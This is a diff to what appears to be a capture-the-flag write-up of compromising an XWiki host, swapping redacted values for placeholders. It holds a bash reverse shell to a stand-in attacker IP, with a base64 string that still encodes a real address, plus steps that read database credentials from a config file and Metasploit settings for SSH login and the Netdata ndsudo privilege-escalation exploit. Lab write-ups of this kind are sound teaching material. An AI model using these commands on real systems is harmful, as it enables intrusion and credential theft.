@@ -153,8 +153,8 @@ The response contained `PWNED:49` — confirming unauthenticated remote code exe
 We base64-encoded a bash reverse shell to avoid issues with special characters in the URL:
 
 ```bash
-# Payload: bash -i >& /dev/tcp/***REMOVED***/4444 0>&1
-echo "bash -i >& /dev/tcp/***REMOVED***/4444 0>&1" | base64
+# Payload: bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4444 0>&1
+echo "bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4444 0>&1" | base64
 # Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMi80NDQ0IDA+JjE=
 ```
 
@@ -202,10 +202,10 @@ cat /etc/xwiki/hibernate.cfg.xml
 ```xml
 <property name="connection.url">jdbc:mysql://localhost/xwiki</property>
 <property name="connection.username">xwiki</property>
-<property name="connection.password">***REMOVED***</property>
+<property name="connection.password">[REDACTED]</property>
 ```
 
-**Credentials found:** `xwiki:***REMOVED***`
+**Credentials found:** `xwiki:[REDACTED]`
 
 ### Why Try This Password for SSH?
 
@@ -312,7 +312,7 @@ Since `gcc` was not available on the target, we used Metasploit from our Kali ma
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 10.129.231.23
 set USERNAME oliver
-set PASSWORD ***REMOVED***
+set PASSWORD [REDACTED]
 run
 ```
 
@@ -331,7 +331,7 @@ This spawned **session 2** — a Meterpreter session (`x86/linux`, running as ol
 ```bash
 use exploit/linux/local/ndsudo_cve_2024_32019
 set SESSION 1
-set LHOST ***REMOVED***
+set LHOST <YOUR_TUN0_IP>
 set LPORT 5556
 set NdsudoPath /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
 set WritableDir /tmp
